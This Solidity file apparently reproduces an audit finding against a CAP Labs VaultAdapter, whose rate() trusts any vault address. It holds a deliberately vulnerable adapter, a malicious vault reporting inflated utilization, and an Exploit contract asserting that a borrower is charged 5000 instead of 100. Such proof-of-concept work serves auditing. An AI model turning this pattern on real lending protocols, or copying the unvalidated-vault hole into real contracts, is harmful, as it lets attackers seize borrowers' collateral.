// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  CAP Labs — VaultAdapter.rate trusts an arbitrary vault
    (Trail of Bits, May 2025, finding 12.1).
    rate() reads currentUtilizationIndex and utilization from _vault and
    stores them. A malicious vault reports 5e18 utilization. The borrower,
    who posted collateral against a 1000 principal, is charged 5000 instead
    of the honest 100. */

interface IVault {
    function currentUtilizationIndex(address asset) external view returns (uint256);
    function utilization(address asset) external view returns (uint256);
}

contract Coll {
    string public symbol = "COLL";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract EvilVault is IVault {
    function currentUtilizationIndex(address) external pure returns (uint256) {
        return 9 ether;
    }

    function utilization(address) external pure returns (uint256) {
        return 5 ether;
    }
}

contract HonestVault is IVault {
    function currentUtilizationIndex(address) external pure returns (uint256) {
        return 1 ether;
    }

    function utilization(address) external pure returns (uint256) {
        return 0.1 ether;
    }
}

contract VaultAdapter {
    struct UtilData {
        uint256 index;
        uint256 lastUpdate;
        uint256 utilizationMultiplier;
    }

    mapping(address => UtilData) public utilizationData;
    Coll public coll;
    uint256 public principal = 1_000 ether;
    uint256 public charged;

    constructor(Coll _coll) {
        coll = _coll;
    }

    function rate(address _vault, address _asset) external returns (uint256 latestAnswer) {
        uint256 elapsed;
        uint256 utilization;
        if (block.timestamp > utilizationData[_asset].lastUpdate) {
            uint256 index = IVault(_vault).currentUtilizationIndex(_asset);
            elapsed = block.timestamp - utilizationData[_asset].lastUpdate;
            if (elapsed != block.timestamp) {
                utilization = (index - utilizationData[_asset].index) / elapsed;
            } else {
                utilization = IVault(_vault).utilization(_asset);
            }
            // @> VULN: index, lastUpdate, and the slope input come from an unvalidated _vault
            utilizationData[_asset].index = index;
            utilizationData[_asset].lastUpdate = block.timestamp;
        } else {
            utilization = IVault(_vault).utilization(_asset);
        }
        latestAnswer = _applySlopes(_asset, utilization, elapsed);
    }

    function _applySlopes(address asset, uint256 utilization, uint256) internal returns (uint256) {
        utilizationData[asset].utilizationMultiplier = utilization;
        return utilization;
    }

    function accrue(address asset, address lender) external returns (uint256 interest) {
        uint256 util = utilizationData[asset].utilizationMultiplier;
        interest = principal * util / 1 ether;
        charged = interest;
        require(coll.transfer(lender, interest), "seize");
    }

    function fairInterest(uint256 util) external view returns (uint256) {
        return principal * util / 1 ether;
    }
}

contract Exploit {
    Coll public coll; // nonce 1
    VaultAdapter public adapter; // nonce 2
    EvilVault public evil; // nonce 3
    address public constant ASSET = address(0xA55E7);

    uint256 public charged;
    uint256 public fair;

    constructor() {
        coll = new Coll();
        adapter = new VaultAdapter(coll);
        evil = new EvilVault();
        coll.mint(address(adapter), 6_000 ether);
    }

    function run() external {
        uint256 quote = adapter.rate(address(evil), ASSET);
        charged = adapter.accrue(ASSET, address(this));
        fair = adapter.fairInterest(0.1 ether);
        (uint256 index,, uint256 mult) = adapter.utilizationData(ASSET);
        require(quote == 5 ether, "evil rate");
        require(index == 9 ether, "stored index");
        require(mult == 5 ether, "stored util");
        require(charged == 5_000 ether, "charged");
        require(fair == 100 ether, "fair");
        require(coll.balanceOf(address(this)) == 5_000 ether, "lender took 5000");
        require(coll.balanceOf(address(adapter)) == 1_000 ether, "borrower collateral left");
    }
}
